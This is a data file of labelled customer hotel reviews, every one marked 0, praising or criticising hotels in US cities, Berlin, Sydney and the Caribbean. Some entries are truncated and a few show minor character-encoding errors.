"kids had fun; great place to stay my family (wife, mother-in-law, 2 boys (3 and 5)) and i stayed at pointe hilton squaw in july/august for 6 nights. we got the dining package ($129/night) which includes $50 meal voucher and stayed in the south tower on the 3rd floor. pros: the $50 voucher and combined with the kids eat free was great. the family had a great dinner every evening and i paid only about $7-10 bucks out of pocket for tip which fed 5 people. we primarily ate at hole in the wall restaurant. the food was good and this restaurant is definitely more geared toward family and kids than lantana, the other restaurant on the property.the rooms were nice, clean, and quiet. we got a 2 double-bed suite. air-conditioning worked fine even in the hot august days.the kids had a great time at the river ranch as well as the pool in the south tower. two tv's allowed the two boys to watch their programs and not fight. laundry facilities on 4th floor was easy to use.cleaning staff was very helpful. we requested a mini frig and microwave for our rooms and they brought them up (subject to availability). the room includes a mini-bar fridge, but this is stocked with overpriced hotel goodies. having our own fridge allowed us to stock up on munchies from a grocery store down the street (bashas) and the kids munched away for much cheaper.cons: $10/day charge for internet access. most hotels that i stayed at included this for free. $10/dy charge to use the gym. this is part of a value package that includes other things (e.g. minature golf on-site, we didn't try this). no complimentary continential breakfast. i tried to call the front desk/reception from my room on a couple of occassions and never was able to get through. i had to walk down to the lobby to get my questions answered.",0
lovely hotel and very quiet! my partner and i stayed here a few weeks ago for 3 nights and found it really nice. the staff were very friendly and the room we had was big and spacious. it is only about a 20 min walk to universal studios which was great and the subway/metro is right near universal. we had the buffet breakfast each morning which was quite nice although i wished they had more continental stuff to choose from! our room was cleaned every day we were there - i have no complaints at all - it was actually the quietest hotel we stayed in throughout our 3 week holiday - which involved going onto hawaii and san francisco!!,0
"Expensive but great! An excellent hotel - quietly located in the Mitte district (within what used to be East Berlin), opposite a quiet square and Humboldt Univ. About 10 minutes walk from Brandenburg Gate, about 10 minutes walk from Museum Island, about 15 minutes by taxi to Kunst Forum where the superb and newly built Gemaldegalerie and Neue National Galerie have excellent art collections.About 20 minutes from Tegel airport by taxi at 6pm in the evening (cost E20 which we thought very reasonable) and about 40 minutes from Schonefeld airport (cost us E40 to get there for our return flight).Much larger hotel than the other Rocco Forte hotel we have visited (Savoy in Florence). Also has outside space (4th floor terrace and bar) which was much appreciated as weather was in the high 80s (in May!!)Extremely stylishly decorated, pleasant bar with live music in the evenings, extensive (but expensive) breakfast buffet. We had lunch there too in the Parioli restaurant (Italian) - very good.In room internet is expensive E20 per 24 hours. Wifi downstairs free of charge but did not try this (if you are on business, you will be in your room!).We had deluxe rooms - extremely large and airy. Not sure I would pay the extra as we heard standard rooms are pretty good too, and we did not spend long in the rooms. Bathroom was perfect - up to ",0

"good place for meeting, not holiday i booked for a relaxing weekend and was rather disappointed. this would be a great place for a meeting but is not much of a resort. my room was off in the middle of nowhere, in a bland hotel wing near nothing. the restaurants were nothing special though they did offer a small variety of food and it did not seem difficult to get a table anywhere.i walked over to the central part of the resort which centers around a waterpark and that seemed to appeal to families so i would recommend for that. the spa was uninspired, and a bit pricey.i may be a bit jaded because i spent the earlier part of the week at the wigwam which was a lovely resort with food so good i could dream about it!",0

"fabulous budget hotel my husband and i are in our 30é¥??? and were looking for a budget hotel to spend a couple days before a cruise. after reading various reviews, we decided to stay at this hotel based on price and location. the location was phenomenal, within walking distance to most attractions and a couple blocks away from the metro and bus lines (which we used with ease). the service was top notch. upon our arrival (via taxi) on a friday night, the front desk attendant buzzed us in and even assisted us with our luggage. he was very friendly and welcoming. our king suite was located on the first floor in the back of the hotel. our room was spacious and adequately equipped with a full kitchen. the coffee maker with coffee, tea, sugar and cream packets was a welcome touch. we had a large patio with 2 chairs a table and a couple lounge chairs, which we used to start our morning sipping coffee and planning out our day. down side was the noise. the maid station was right next to our room. we tried taking an afternoon nap, only to hear them talking very loudly, vacuuming, etc. the entire time. the pool looked nice, but we did not have enough time to use it. highly recommend if you want something simple at a great value!",0

"fantastic little hotel-recommended!!! my boyfriend and i spent new years in hong kong and booked 6 nights at the luxe. i had read good reviews on the tripadvisor website so was keen to see if it would meet my expectations.i have to say this boutique hotel is fabulous and overall exceeded my expectations (apart from a slight hiccup at the start!). upon arrival we were presented with a standard room and although we were delighted with the funky decor-the room had a strong stench of smoke. disappointed, i immediately went down to reception to complain that we had requested a non smoking room and that this was not acceptable. the man at reception responded immediately apologising and said he would find us a more suitable room and to wait at the room and he would return shortly. within 5 mins he was back and said he had another standard room to show us. this room was on a higher floor with a better view and was much cleaner and fresher. we happily accepted the roomi!!i honestly can say this was the beginning of the exceptional service we recieved from the staff at the luxe. honestly they went out of there way to bring a smile to our face. whenever we asked for room service, directions, restaurant recommnedations etc they were more than helpful to accomo",0
beware.. this place is terrible we arrived to find that we had no room. after much discussion we were found a room... which had no hot water and the water pressure did not exist. this was the high point as we needed wading boots to get to our bed. the air conditioner had a leak which soaked the carpet. the ac had not been turned on so we had the pleasure of staying in a stinky moldy room. hotels.com was of no use. our stay was hoffific.,0
"terrific weekend stay we stayed here iin late may as we were attending a wedding reception at the hotel. the front desk was very cordial and helpful. we arrived shortly after noon due to an early flight arrival. they were able to give us several room choices and we relaxed on the grounds. enjoyed the cocktails in the evening and breakfast on the deck. the room, facing the courtyard, was large and comfortable. we were far from the front area, but like that so we could take a walk. beautiful, well maintained grounds. we sat around the pool and although did not swim, we enjoyed all of what was going on. this hotel is easy to find and close to the freeway. we have not stayed at an embassy suite before, but after this nice experience would check it out.",0
"close to union square i found this hotel to be a great base, i mean who needs a luxuary hotel, when you're going to be out all day and then just need somewhere to rest your head at night? it was really cheap to stay here with lastminute, we paid ?¢25 a night for our room! it's a 5 minute walk from union square and getting on trolleys etc, near some bars and restaurants and the staff are really helpful and really friendly. ok the rooms aren't decorated to the best of taste, but it added some amusement to our video diary! i would stay here again!",0

"nice remodel, fantastic beds, nicest hotel at lax! the new sheraton gateway, after an extensive lobby overhaul, the addition of the overpriced but above-average shula's, and room renovation (but not the bathrooms) is a pleasant place to stay. like many reviewers state, it's a bit cold - check the pics - greys, blues, and black. while it's a modern feel that looks contemporary, it doesn't feel welcoming, but that will change once you try the new beds, the best part of the renovation. the pool area is fine, small, shaded, andclose to the runways (only the radisson sits closer), but you won't hear much noise from the room. this hotel is a good deal if you're not looking for a warm feel and can spend between $70-100 through hotwire or lastminutetravel. also, be aware - parking is a nightmare, valet is good but expensive, and street spots are non-existent. the sheraton's the newest remodel in the area at the 4 star level, far nicer than the westin, marriot, or crowne plaza.",0

"great classic sf hotel i pricelined my reservation for a rate of $70, which was a steal. this is the second time i stayed at this hotel, and i was glad to stay there again. the location is great--right in the heart of nob hill. if you are interested in riding the cable cars, two lines run right outside the front of the hotel. if you are a runner like me, you will be rewarded with a nice downhill run to the bay and challenged with a tough uphill run back to the hotel. take jones street for a real workout... the decor is old/classic style. the rooms are fairly spacious. but the beds are outstanding. the beds have down pillows, featherbeds, and down comforters that are way better than westin heavenly beds. the bathrooms have marble vanities.insider tip: make sure you place a wake-up call (whether you need one or not). all wake-up calls receive a pot of coffee, hot chocolate, or tea delivered to your front door. nice touch.",0

"dingy and dank! don't be fooled by the other reviews. they must be written by the ownership! this hotel is gross. every fabric surface of the interior was stained. the beds were totally uncomfortable. at first i thought they had me sleeping directly on the box spring mattress! kids rented a room across the hall and were smoking marijuana outside my door. the smoke came into my room! seriously. i complained, but they didn't kick the kids out for several hours. there were bums climbing in the garbage cans outside the hotel. i selected the hotel because it was reasonably priced and close to the downtown and space needle. guess what. it ain't that close! you're still about 12 blocks from the main downtown attractions and about 6 blocks from the space needle. i took a cab downtown. if your looking to save money i would suggest that you stay at hotel further away from the downtown area or pony up the extra bucks a night and stay at someplace decent. seriously! this is not a joke. i live in east oakland california so i know what bad conditions are, and this place reminded me of a cheap rent by the hour motel!",0

wonderful i have stayed at the renaissance on more than one occassion and have never been disappointed. the staff were helpful...even asked them for a red balloon (we were playing a game) and then asked them for a wine opener which was delievered to our room in a matter of minutes.ask for a room with two queen beds...they are spacious and lovely. the location is perfect with cable cars at the corner and cabs right at the door.you will enjoy your stay.,0

"a great hotel for a honeymoon ever! we stayed here over the christmas period as the first half of our honeymoon.our first impressions of the hotel were excellent. we were met from the taxi by a doorman in pristine, traditional dress who whisked our suitcases away and delivered them to our room promptly. check-in could not have been better and the bunch of red roses we were given were stunning.the room was immaculate and, in my opinion, not at all",0
very nice we chose to stay at embassy suites for our first night after flying to los angeles as it was very close to the hertz rental site.the staff were very polite and the room was spacious and clean.the in room service food was delicious.all in all an enjoyable place to stay and very convenient to the airport. i would be happy to recommend it to anyone and will return there again when we fly to los angeles in the future.,0

"tuscan inn lives up to reputation if you were lucky enough to be in san francisco from wednesday, february 22nd through friday, february 24th then you know the weather was awesome. but, what was just as good was to come back to the tuscan inn each day. the best western tuscan inn continues to review well on tripadvisor because it continues to live up to its reputation in both price and value. this is not budget hoteling, but its not the hyatt either. i continue to find bw's in unique places with good property locations. we stayed in the 330's on the mason street side as opposed to the busier north point side. we even had a veiw from our window of coit tower. traffic noise was minimal, too, and surprisingly calm at night. watch out, though, for the windows extending out especially with little kids in the room. rooms are a bit tight especially if you get the two doubles. decor looks nice (trying for the tuscany feel) and let's just say the beds were soft, cozy, but firm so no issues with sleeping. surprisingly quiet at night, too. bathrooms, though, are plenty big. no room for rollaway so grandma got her own room, but she did baby sit one night. also, we got connecting rooms, but check first because there are only so many available. nice to have when travelling with other relatives with kids. yes, happy wine tasting hour is a bit crowded, but fun and a great way to get in the mood for nice night out on the town not to mention getting some ideas from other travellers. besides wine, the hostess (i think she was the night manager) served peroni beer which was unexpected and refreshing. in the mornings, of course, the coffee (very good) and biscoti's are available down in the lobby same as happy hour. can't beat location, mason and north point. minutes away from fisherman's wharf, pier 39, etc. no. 9 fisherman's grotto is classic for dinner and cannot beat the view. we also did the beach chalet at teh end of golden gate park one night with surfers and sunset views to die for. upon arriving into sf via 2 autos, it took us less than 10 minutes to get to the hotel from the bay bridge exit and onto embarcadero until we came to north point. you can walk to the buena vista (best breakfast and irish coffee), north beach (vesuvio's a must) and even lombard street, but at night take cabs for sure. despite not having a pool, the kids loved the tuscan inn, too. lot's of great comfy space in the lobby. the concierge at the tuscan was excellent considering he was constantly busy. front desk staff were always pleasant. maid service was prompt, too. when we arrived we simply pulled up to the hotel and had the bellman help us. parking is an issue in sf so either pay the $30.00 plus a day to park at the tuscan or find something cheaper in the city. with muni (1.50 for adults, .50 kids and seniors) and cable cars ($5.00 one way or 10.00 all day anytime) you don't really need autos do you? again, the tuscan inn lived up to its reputation.",0

"the tired casita we stayed two nights in a casita at the pointe hilton squaw peak resort. other reviewers have mentioned that the property is upgrading the casitas. they definitely had not made it to this one yet. the unit had a bedroom and bathroom upstairs and a good sized common area downstairs. the spaces were okay but everything was really tired. the carpeting was dated and worn as was the furniture. it may take several visits to the chiropractor to recover from the fold out couch experience.the resort itself is actually pretty nice for a family with kids. the water park, mini-golf and sports courts are nothing fancy but just fine for young kids. we ate one meal at the hole-in-the-wall restaurant and it was better than average.the whole resort is a very large facility and if you're in one of the casitas, be prepared for a long walk to get back to the main areas. also, many of the casitas border a residential street so you don't have the feel that your in a vacation location.all in all, you get about what your pay for which is a decent resort at a decent price.",0

"fantastic hotel we visited the hollywood roosevelt in november 2003 for five nights.on arrival we were upgraded to a fantastic suite on the 11th floor.it was very spacious with two kingsize beds,and a huge bathroom which contained a wet room and a bath.the toiletries were plentiful and of excelent quality. we had a view of hollywood blvd,and could see right into the forecourt of manns chinese theatre.we were also very pleased to find that we had a perfect view of the hollywood sign.the hotel was in a brilliant location,taxi to warner bros studios was $10,the tube to universal studios is a minute walk away and whilst on the tube is only a five minute ride.mels diner is a great place to start the day, breakfast is well recomended and not too expensive.next door to mels diner is the max factor museum which contains loads of hollywood costumes and make up worn by the stars for example-marilyn,joan crawford. we were travelling with our 10 year old son who found the outdoor heated pool fantastic,and went for a few moonlit dips.i would reccomend this hotel to anyone.the sheer history of the hotel is overwhelming so dont let other reviews put you off.i would love to go back someday.",0

"great resort, if you're white... we recently stayed at the legacy golf resort for a week. it was going well, until we started using their fitness facility. i was basicallly booted out of the fitness center because i was not white. i felt like a black man in a kkk meeting.i thought racism has died down since the 70's, apparently i am dead wrong. racism and prejudice is still very much alive in this country and in particular, arizona.i would'nt recommend staying at this resort unless you are white.",0
"very convenient to hertz rental stayed here labor day sunday. it was really convenient, as i discovered, to the hertz rental returns. the hotel is just a half mile up the road from the return lot, and after turning in the car, hertz gave me a free ride back to the hotel, so it made the whole process very easy.i got the reservation extremely cheap through pl, so i had absolutely no complaints about the cost. the room was somewhat far from the elevator, and there's only one (elevator, that is), but other than that, the suite was your usual es, roomy and comfortable room.the tv in the bedroom was a little on the dark side, and i couldn't find a brightness adjustment, but i was able to swing a wifi connection for free, so i was pleased about that.the free breakfast is pretty standard but very convenient if you're leaving for the airport. they have a griddle stand where you can order your standard breakfast fare, including eggs, pancakes, bacon, etc, plus they have all of the other cold items, such as cereals and some freshly cut melons.i will also note that they listed a laundry on the second floor (i was on 4). although i didn't use it, this is something that i would in other instances and i am sure that others would find very useful on an extended trip.i've also stayed at the radisson near lax and i think this one is more convenient for a number of reasons, although i might pick the radisson if i really didn't need breakfast or to return a car (not that it really matters on pl since you don't get to pick anyway!)",0
"absolutely fantastic place.....book this now! this is one great hotel! it's located in an historic building which used to be the police headquarters for boston, yet the rooms are ultra hip, modern, and very spacious. we booked this as the last night of a seven day trip to new england and wished we would have stayed here instead of the fairmont copley plaza, where we had spent three days at the start of our vacation.the bathroom was the biggest one i've seen in years, marble, glass, and even a heated towel rack. it had a separate, glass doored shower with two shower heads, a separate tub and a gorgeous vanity. the bed was comfy and the place was quiet.we did have a drink in the bar (there are two) - one is crazy noisy - it's called cuffs and filled with twenty and thirty-somethings. the other is a lobby bar, nice and quiet and se",0

"good time, good bargain i stayed at ifa bavaro from feb 4-12. ill change it up a bit and i wont repeat what everybody else said, the beach is by far the nicest part of the hotel, this isnt a party hotel so anybody looking to have party's this definately isnt the hotel for you, the mini disco is basically for young children, that could either be good or bad, depending if you have young children, there are more retired people then anything tho, the bar is very good during the day time but at night there is big lines, there are not all that many things to do but its all inclusive so if you sit at the bar you will make the best of your situation, they have internet service there, no mini bar, no tennis courts, and if you can i would try to book it so you are not in one of the town houses that is about 15 min walk to the beach, you actually have to cross a street to get there, but im sure it is quieter, shopping is very fun, they usualyl give you little freebies for going to there shop, if you are feeling intimi",0

"a great experience! a few friends and i planned a spur of the moment, 4 night trip to los angeles. the pictures of the biltmore looked wonderful and we really liked the location so we made our reservations. i started to get a little worried after reading some reviews about the hotel and i just figured that i would have to find out for myself. i just want to say that my experience was absolutely perfect! everyone at the hotel, from the concierge to security to the valets and housekeeping, were incredibly friendly and accomodating. we wanted to check out the ballrooms on the lobby level (the crystal ballroom is where the academy awards used to be held) but some of them were locked. we happened to come across a security guard and just inquired about the history and he offered to take us through the locked ballrooms. the valet service was very convenient and not unreasonable (anyone from a large city would be used to paying for parking). we had a large corner room which had 3 huge windows that faced onto a courtyard - it was bright and extremely quiet, we didn't hear any traffic at all which was nice considering we were staying right in downtown la. this is a great location, very close to everything...took less than 30 minutes to get to santa monica beach on a beautiful friday afternoon. i would definitely stay here again!",0

"great hotel in a busy buzzy location darling harbour is a wonderfully buzzy area, with masses of restaurants, attractions and shops, so it's a great place to stay. the medina is right next to wildlife world and the aquarium and directly adjacent to many of the quays where the tour boats and water taxis depart from. ideal. if you want harbour views, though, be sure to get a room on the top (6th) floor otherwise your view will be obscured by the building between the hotel and the harbour front. our very nice suite had a smallish but perfectly comfortable bedroom (with a tv rather neck-achingly mounted on a stand in one corner at ceiling height!), sitting/dining room area with open plan kitchen and spacious bathroom with bath/shower, sink and, inside a cupboard, washing machine and tumble drier. our daughter slept on a not-too-uncomfortable (though slightly institutional looking) put-you-up bed which we easily moved the furniture in the living area around to accommo",0

"sunrise punta cana, d.r. i had read many of the reviews of the grand paradise before leaving with my wife, two daughters and son-in-law and frankly was concerned. we arrived in punta cana with no luggage. none for the five of us. they had overbooked the rooms and sent us to their second hotel/time-share area called the club. it seemed things were going downhill fast. our ground transportation was provided by turinter and their representative, noel, did everything possible to locate the luggage. with his assistance, the luggage arrived the following day on the next flight. the club was a blessing in disguise. the rooms were very large with a jacuzzi. our balcony faced east, so the items set out were dry by 9 am. the pool at the club had a swim up bar and the best bar was at the mangler restaraunt area where they actually made mixed drinks. the other great bar was at the main hotel, upstairs. i believe i attended six bars in all. a train ran frequently to shuttle between the two resort locations. not a big deal.our standard breakfast was at the international where they served a continental style breakfast and you could also order off the menu. excellent omelets. at the main resort a full buffet was available, we just did not feel like eating that much. we had supper twice at the international, once the italian and once chinese. each exceeded my expectations, not gourmet, but very tasty. service was great, not always fast, but always with a willing spirit. fresh fruit at every meal. take a pair or two of long pants for the evening sit down restaurants, no shorts allowed.the staff genuinely liked to be helpful. most of the waiting and service people spoke english and french. they work long hours each day and 26 days a month. tips of any size were appreciated though not expected. we took two dollar bills which got attention, they said it was good luck. maybe it was good luck to get two dollars rather than one.the resort has a real european flair. many french. we also met people from canada, lichtenstein, germmany, spain and russia. toplessness was practiced on the beach area, only seldom around the pools. even at that, you had to look to find a topless bather. frankly the beach and sea was so spectacular you did not notice.we drank the water provided with the meals and a fresh gallon of water was provided to our room each day. we re-filled our small bottles a few times. dad used the imodium the last day, the others were fine.it is a great place to come if you are a couple or large family. they can accommo",0

"beautiful renovation spent three nights here in late august with my 10-year old son. we had a terrific time. the property was renovated with an eye for detail. the room was great, with dark wood modern furniture, a large lcd tv, terrific beds and a stylish bathroom. the bathroom lights weren't functioning properly, and they promptly sent a very courteous repairman to fix the problem. even the hallways and elevator lobbies on each floor are very stylish. i was told that the pool area is to be renovated soon, and i was kind of surprised because it is very nice as is. looking forward to seeing what they do with it.we booked the aaa rate and to our pleasant surprise we were given vouchers for free breakfast for both of us for all three days of our stay, the restaurant, breezes, serves terrific breakfasts, although i would certainly not spend $55 for breakfast for two if it were coming out of my own pocket, the hotel location is terrific. we went to eat at the century plaza mall several times, and the standouts were houstons and french 75, both of which had terrific food and treated my son with respect. the food court on the top level has some nice lunch options, as well. we went to see the harry potter movie at the new amc movie theater in the mall, which has comfortable stadium seating.my only real issue with the hotel is the $31 valet parking charge, which i feel is excessive. all the nice hotels in southern california are doing this now, and i think it is outrageous. aside from that, loved this place and i will be back.",0

"loud and obnoxious stayed here while on a business trip. it has a great poolside bar for cocktails, two great restaurant options and the cabana rooms were super cool (although a bit dark). everything seemed to be great and, with all the high security, we were convinced there must be a celebrity staying there. in the early evening, the cabana bar started playing music that was really loud but really good. fine, i thought, by the time i get back from a late dinner i'm sure they will turn it off - there's no way they'd expect guests staying in the cabana rooms to sleep with that music blaring. when i returned at 11pm the music was still going strong. i thought about switching rooms to the main tower where it might be quieter but, again, thought management couldn't possibly keep the music going all night. i was wrong. after a bleary-eyed investigation at 1 am i realized there were literally speakers right outside my room! at 2 a.m. they finally turned off the music. i was exhausted and had a full day of work ahead of me and had just paid a small fortune for the room.i'm only in my early thirties and usually not bothered by good music. but how do they expect anyone except twenty-something party-goers to stay here?",0

"best airport hotel bar none this is the best airport hotel property i have ever stayed at. there is almost nothing to do around lax, very few restaurants, bars, fun things to do. so if you have to be there for a nite before you leave town, this is the best hotel to stay at. by far!the vibe feels almost european, maybe b/c several of the front desk people are, maybe because of the very sleek feeling of the hotel. i feel more like i am in the downtown of a fun city than at an airport area with nothing going on.front desk is always helpful, and the lobby is always abuzz. always, and in a good way. there are some very hip, cool chairs in the lobby bar area, and they are always full. the rooms are nicely updated. try and get a room where you are facing the runways. it is pretty cool. by the way there are often very good prices at this location. do not bother with staying at the westin, which often is a more upscale starwood brand. this is a much better overall hotel.",0

A Nice Find My partner and I recently traveled to NY. During a casual conversation with a friend who visits NY often he mentioned Hotel Mela. So I immediately came to TripAdvisor to get some reviews. i booked several hotels and in the end decided to stay at Hotel Mela.We arrived late Friday afternoon and were greeted by a courteous staff. We were a little concerned about the location since we did NOT want to be in Times Square. The hotel web site was accurate in saying they were a block or two away from Times Squre.Knowing that several folks had suggested I get a high floor room we asked for a higher floor after initially being given the 10th floor. We ended up with a room on the 16th floor. Wanted to make certain we avoided any street noise.The room was very nicely appointed. We booked the Executive Junior Suite. I wished I had looked at the Executive King since someone from the hotel mentioned he preferred the Executive King. Both had the same rate.It was hot in NY that weekend and our AC worked beautifully. Nice flat panel TV was also in the room. Pretty decent closet space.My one small gripe was the small bathroom. While it was very clean it was just small. We could never be in the bathroom at the same time and had to alternate using the sink and mirror. On the plus side the shower did have a window that allowed bright sunlight to come in. Of course folks on the outside could not see in.The conceirge was amazing. We often asked them to assist us with the address of a restaurnat for which we could not remember the name of the restaurant. Only the general street location. They also gave us great tips on where we should go to watch the PRIDE parade. Housekeeping was very good. We never saw them but the room was always cleaned. Turn Down service was cute.I would definitley stay here again. If you book on Mela's web site you might want to recheck rates periodically. I did this often and saw their rates flucuate....but not always UP as your visit ,0

"great customer service but lacking in other areas... stayed at this place because i had a business meeting in downtown seattle. this hotel is right in downtown seattle but is in the pioneer square area. to me, this area was pretty bad and i would walk around there alone (i am a woman). i would not feel safe there. anyway, the hotel is pretty nice and the customer service is first rate. the room was very large but the bed was extremely uncomfortable. great pillows but my body ached from sleeping in the very hard bed. the shower was the best part! big and plenty of hot water!! i loved that part!luckily i didn't have to pay for the room but it was pretty expensive - not worth the money to me. and, parking is a mess there - you have to park about 2 blocks away in this parking garage that is not run by the hotel. it is very inconveinant.....",0

"excellent hotel in great location huge, comfy beds, a heated outdoor pool [in which we swan at10pm] and in a wonderful location.the only down side to a hotel such as the omni is that, being quite pricey all the services are, too. being a select guest ww were very glad of the free early morning coffee or hot chocolate.there are lots of rooms with good views -our 18 yr old son was mesmerised by ours of the citybank tower. the subway and grand market are literally one and two minutes away from the rear entrance, disney concert hall less than 5 mins walk, the mocanearer. there are not too many places to eat in the evening but we walked purposefully down to the pantry or denny's diner for instance, in about 20mins and never felt intimidated.chinatown and union station restaurants about the same in the other direction.public transport is great ad it is easy to get aound by subwayand bus. even the 50 mins to santa monica lets you see real people and the local sights.we had such a wonderful time last october we brought our son in april.no need for universal studios -it seemed the whole place was a movie set at times and we saw some films being shot in the streetif you're travelling on to san diego get the amtrak-it's very reasonable, comfortable and the vfiews are spectacular.",0

disappointing this was the first of three hotels used on our trip to california and was by far the poorest. the rooms were ok but the noise from the freeway was constant and the windows had double glazing which had the noise reducing qualities of tissue paper! i would strongly advise the management to replace these as they are useless.the lift nearest our room went out of service which meant a trek to the opposite end of the wing. i was not impressed and would not recommend to others.,0

nice downtown hotel i strayed at this hotel because i was going to two games at chase field which is a short walk. the lobby was impressive. the front desk was very friendly. the rooms were nice and big. the beds were very comfortable. the outdoor pool was nice. especially for a day that was 103. the excersise room had a lot of machines to use. the parking per day was $10 a day not bad for a downtown hotel. i would reccomend this hotel foranybody that is in town going to the us air arena or chase field,0

"horrible dirty hotel we booked this hotel as it was fairly cheap and although it had some mixed reviews we thought we'd give it a try. that was a mistake! the hotel reception is nice, however when you get up to the rooms thats a different story. my bed sheets had cigarette burns, the carpets were filthy and on the last night i shared my bed with some bed bugs! the location of the hotel was good since it was near to union square, however if you turn right walk up the street its a pretty scary neighbour. overall the hotel spoiled our trip to san francisco, i'm just glad we were only there for 3 days, i couldn't have lasted any longer.",0
"great location, dirty, old room we atayed at the stanford court on the last leg of a ca trip that included la, yosemite and then four days in san francisco. we were very displeased and disappointed with the condition and size of the room and bathroom. we booked a family room which had two queen beds. because i was traveling with my spouse and two teen children, i was expecting a larger room with adequate storage for clothes. i have been a marriott member for many years, and this is quite honestly, the worst marriott property i have ever stayed at. upon arrival, the bellman took us to our room and immediately suggested that i contact the front desk and ask for another room, because he felt that there might a better accommodation for us. unfortunately, the hotel was booked out and there was not another room to be had. even though i complained, they never offered to make amends of any sort. the front desk told me that they have a limited number of these so-called family rooms and because of that they are always booked up and never have a chance to refurb them.there was no storage for clothes and limited floor space for suitcases. we had to live out of our suitcases - and pushed the two chairs together to make room to get one suitcase off the floor. everything was old - carpet, furniture, and the bathroom is another story. outside the bathroom, was a separate counter with a sink and an old tv sitting on it. if they consider this an amenity, they better think again. it looked like it was from the 1970's and worse yet, no one had ever taken a dust rag or cleaned it in all that time. when i tell you it was laden with filth and grime, it is no exaggeration. who would want to touch it to even turn it on. it would have been better to remove it altogether, and make more room on the counter. the bathroom had an old rubber bathmat hung over the shower door that was covered with dirt or mold - couldn't tell which. it surely would have been a breeding ground for athletes foot. i did complain to housekeeping and they wiped off the tv and brought a new rubber bathmat. considering the state of the room, nothing housekeeping could have done, would have made it much better. i work out daily, and the workout room was small and dark, the worst i have ever encountered. the upside to this stay is that we were on the go all day long, and we did not spend much time in the room. if you like staying at nice properties and expect cleanliness and amenities, i would not stay here. by the way, there is no concierge level at this property. the location is very nice - the cable cars are on the corner outside the hotel. even if you are a marriott member using points, i wouldn't waste them on this property. if you get a super-low rate through a third party vendor and you don't mind taking luck of the draw, go for it.",0
"a comfortable stay i was here for two nights in june: my second stay at the crowne plaza. i found it to be very comfortable both stays, and since i often have business nearby will undoubtably stay again.check in went well, and the desk staff was very helpful. my rooms both times were as requested, and were large, with nice views, lots of light, very comfortable beds, a lounger and an ottoman, and well-apppointed bathrooms, wireless that worked well, quiet.....no complaints, though i agree with those that say that the breakfast is so-so here. however, it is walking distance from several other restaurants. the location is quite convienent for west side activities.a good value for what you get and for beverly hills; recommended.",0

"get the suite - you'll be in heaven!! We stayed at this resort for a few days in late November for a friend's wedding and it was a great time. Right off the bat I'd recommend that you spend a little extra (it's not much more) on the suite rooms - they are fantastic, huge king bed, balcony, living room, surrounded by marble -we had a party of three in there comfortably with the fold out bed couch. I loved the little plate of desserts and complimentary glass-bottled sodas they'd resupply each day. THE GOOD: The pool is huge, with different areas to explore, including a wading section, volleyball area and an impressive tiki-hut thatched roof above the expansive swim-up bar. Plenty of lounge chairs in every direction. Friendly service all-around, including the bartenders. This resort is big; you have to walk around quite a bit to get to places. The buffets were about average, sometimes missing the mark on something like marinara sauce where you can notice ketchup was used to stretch it. We gave them the benefit of the doubt. Most of the food was pretty good. The ambiental music is on throughout most the day but they seem to take breaks now and then. Some resorts just blast it nonstop. Make sure to hit the Cigar Shop on-premise - we picked up a large box of Cohibas for about US $200 which is a steal. They have a few ping pong tables woo-hoo! And a dance club which could use a good power-washing (it reeked of something gone wild). The best amenity is the 24 hour oceanside sports bar adjacent to the 24 hour snack hut. A few nights we gave them a good run. There's stuff like rock wall climbing, a trapese area, on-beach massages, parasailing, horseback riding, bike rentals, tennis courts. Plenty of activity here. The beach was very pleasant, white sand, water in the tropical blue hues you see as described - the water was a bit choppy, although refreshing. THE NOT SO GOOD: Check-in seemed to take a while from the too-relaxed staff. A slight inconvenience: no hot water at all (showers). We didn't complain because everything else was just right and suites we're sold out and we didn't want to give ours up. TV reception is bad, not that we went down to watch TV but c'mon, get with it. The Japanese steak restaurant, Tokyo, tries hard to approximate the Benihana experience - just don't compare the two side by side. All the food was freshly cooked in front of you, but it all tastes like soy sauce, whether shrimp, beef, chicken or fish. The tempura appetizer looked like children's school erasers they were so tiny. Oh and we had two power outages during our meal which was both awkwardly amusing and slightly disconcerting. That experience led us to try the sake, which led us to try the wines, which brought us back to the saftey drink, Cuba Libre. Whatever the Italian restaurant is named - Roma, or Michaelangelo's, is of similar quality - so-so. If you're staying during the weekend be prepared for major traffic as the resort allows locals to come in and hang out around the pool, drink it up and win the MARACCA DANCE CONTEST. These are fixed so that the Dominican ladies always beat out the touristas. Someone should complain, but with a tan and pina colada replacing your vital fluids after a few days, does it really matter? You'll have the chance to buy paintings, carvings, necklaces and all sorts of island-inspired knick-knacks. Be sure to bargain if that's in you're nature, my one friend bought a sculpture at 50% of the artist's asking price. BOTTOM LINE: This place is worth a stay, the service if great, the facility is up to par and they do go out of their way to accomo",0

"good deal during mid-week my wife, 12 year old son, and i just returned from a one night, mid-week stay. we got a nice room that had a southerly view towards union square. it was elegantly appointed, clean, and had a very comfortable bed. the windows open, thus allowing the nice cool, fresh air inside. although we were on the fourth floor, the outside noise was not bad, especially after the cable cars stopped running for the night. the location makes a walk to union square easy (walking back..and uphill is a different matter.) we booked our room through priceline ($100.00). with tax, that comes to about $120.00. parking is another $39.00, so i instead parked at the sutter-stockton garage (three blocks away) and paid $18.00 for 4:00 pm to 9:30 am the next day. the only negative was the snooty attitude of the front desk staff when we asked for a room with a view. she said that the hotel doesn't assign view rooms to people who book through a discount online service; however, she nevertheless gave us a room with a good view.by the way, priceline was $79.00 better than anything we found on orbitz, expedia, etc.",0

"unimpressed with the biltmore the biltmore is an old beautiful hotel in downtown los angeles. however, the old portions of the hotel outweighed the beautiful parts. the lobby and accompanying area are quite well-done, it is interesting staying in a hotel that has hosted many 1950s award shows. it seems though that the rooms have not been redone since right before the 50s shows. we were surprised that the tv was color (the most modern feature in the room). i can appreciate historic hotels, but at some point the guest rooms need an update. the property is large and i figure this is the reason that the housekeeping did such a shabby job cleaning the room. overall, we were disppointed especially having come from another historic hotel in santa monica that had done everything right. if you don't need to be in downtown la for business, don't stay in downtown. however, if work brings you into the city look elsewhere for a quality hotel, the biltmore missed the mark.",0

